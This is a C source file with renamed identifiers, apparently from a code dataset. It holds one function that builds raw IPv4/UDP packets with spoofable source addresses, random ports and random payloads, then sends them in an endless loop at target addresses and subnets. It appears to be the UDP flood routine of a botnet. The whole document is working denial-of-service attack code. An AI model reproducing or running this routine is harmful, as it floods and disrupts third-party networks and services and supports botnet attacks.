
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef int uint16_t ;
struct udphdr {void* dest; void* len; scalar_t__ check; void* source; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; scalar_t__ check; int daddr; int protocol; void* frag_off; void* tot_len; } ;
struct TYPE_2__ {void* sin_port; } ;
struct attack_target {int netmask; TYPE_1__ sock_addr; int addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 void* FUNC_1 (int,int) ;
 scalar_t__ FUNC_2 (int*,int) ;
 scalar_t__ FUNC_3 (struct iphdr*,struct udphdr*,void*,int) ;
 int FUNC_4 (int) ;
 scalar_t__ VAR_18 ;
 int FUNC_5 (scalar_t__) ;
 void* FUNC_6 (int) ;
 scalar_t__ FUNC_7 (int ) ;
 int FUNC_8 (char*,...) ;
 void* FUNC_9 () ;
 int FUNC_10 (char*,int) ;
 int FUNC_11 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_12 (int,int ,int ,int*,int) ;
 int FUNC_13 (int ,int ,int ) ;

void FUNC_14(uint8_t VAR_19, struct attack_target *VAR_20, uint8_t VAR_21, struct attack_option *VAR_22)
{
    int VAR_23, VAR_24;
    char **VAR_25 = FUNC_1(VAR_19, sizeof (char *));
    uint8_t VAR_26 = FUNC_0(VAR_21, VAR_22, VAR_4, 0);
    uint16_t VAR_27 = FUNC_0(VAR_21, VAR_22, VAR_3, 0xffff);
    uint8_t VAR_28 = FUNC_0(VAR_21, VAR_22, VAR_5, 64);
    BOOL VAR_29 = FUNC_0(VAR_21, VAR_22, VAR_2, VAR_10);
    port_t VAR_30 = FUNC_0(VAR_21, VAR_22, VAR_9, 0xffff);
    port_t VAR_31 = FUNC_0(VAR_21, VAR_22, VAR_1, 0xffff);
    uint16_t VAR_32 = FUNC_0(VAR_21, VAR_22, VAR_7, 512);
    BOOL VAR_33 = FUNC_0(VAR_21, VAR_22, VAR_6, VAR_17);
    uint32_t VAR_34 = FUNC_0(VAR_21, VAR_22, VAR_8, VAR_14);

    if (VAR_32 > 1460)
        VAR_32 = 1460;

    if ((VAR_24 = FUNC_13(VAR_0, VAR_16, VAR_12)) == -1)
    {



        return;
    }
    VAR_23 = 1;
    if (FUNC_12(VAR_24, VAR_11, VAR_13, &VAR_23, sizeof (int)) == -1)
    {



        FUNC_4(VAR_24);
        return;
    }

    for (VAR_23 = 0; VAR_23 < VAR_19; VAR_23++)
    {
        struct iphdr *VAR_35;
        struct udphdr *VAR_36;

        VAR_25[VAR_23] = FUNC_1(1510, sizeof (char));
        VAR_35 = (struct iphdr *)VAR_25[VAR_23];
        VAR_36 = (struct udphdr *)(VAR_35 + 1);

        VAR_35->version = 4;
        VAR_35->ihl = 5;
        VAR_35->tos = VAR_26;
        VAR_35->tot_len = FUNC_6(sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_32);
        VAR_35->id = FUNC_6(VAR_27);
        VAR_35->ttl = VAR_28;
        if (VAR_29)
            VAR_35->frag_off = FUNC_6(1 << 14);
        VAR_35->protocol = VAR_12;
        VAR_35->saddr = VAR_34;
        VAR_35->daddr = VAR_20[VAR_23].addr;

        VAR_36->source = FUNC_6(VAR_30);
        VAR_36->dest = FUNC_6(VAR_31);
        VAR_36->len = FUNC_6(sizeof (struct udphdr) + VAR_32);
    }

    while (VAR_17)
    {
        for (VAR_23 = 0; VAR_23 < VAR_19; VAR_23++)
        {
            char *VAR_37 = VAR_25[VAR_23];
            struct iphdr *VAR_38 = (struct iphdr *)VAR_37;
            struct udphdr *VAR_39 = (struct udphdr *)(VAR_38 + 1);
            char *VAR_40 = (char *)(VAR_39 + 1);


            if (VAR_20[VAR_23].netmask < 32)
                VAR_38->daddr = FUNC_5(FUNC_7(VAR_20[VAR_23].addr) + (((uint32_t)FUNC_9()) >> VAR_20[VAR_23].netmask));

            if (VAR_34 == 0xffffffff)
                VAR_38->saddr = FUNC_9();

            if (VAR_27 == 0xffff)
                VAR_38->id = (uint16_t)FUNC_9();
            if (VAR_30 == 0xffff)
                VAR_39->source = FUNC_9();
            if (VAR_31 == 0xffff)
                VAR_39->dest = FUNC_9();


            if (VAR_33)
                FUNC_10(VAR_40, VAR_32);

            VAR_38->check = 0;
            VAR_38->check = FUNC_2((uint16_t *)VAR_38, sizeof (struct iphdr));

            VAR_39->check = 0;
            VAR_39->check = FUNC_3(VAR_38, VAR_39, VAR_39->len, sizeof (struct udphdr) + VAR_32);

            VAR_20[VAR_23].sock_addr.sin_port = VAR_39->dest;
            FUNC_11(VAR_24, VAR_37, sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_32, VAR_15, (struct sockaddr *)&VAR_20[VAR_23].sock_addr, sizeof (struct sockaddr_in));
        }





    }
}
